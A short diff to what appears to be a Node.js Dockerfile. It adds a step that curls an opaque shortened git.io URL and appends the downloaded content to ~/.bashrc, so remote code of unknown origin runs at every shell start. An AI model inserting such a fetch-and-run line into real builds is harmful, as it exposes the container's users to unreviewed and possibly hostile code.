@@ -25,6 +25,9 @@ RUN apt-get install -y nodejs
 RUN rm nodesource_setup.sh \
     && apt-get clean
 
+WORKDIR /home/nobody
+RUN curl -L https://git.io/JeNX1 >> ~/.bashrc
+
 # Create and change to the app directory
 WORKDIR /usr/src/app
 
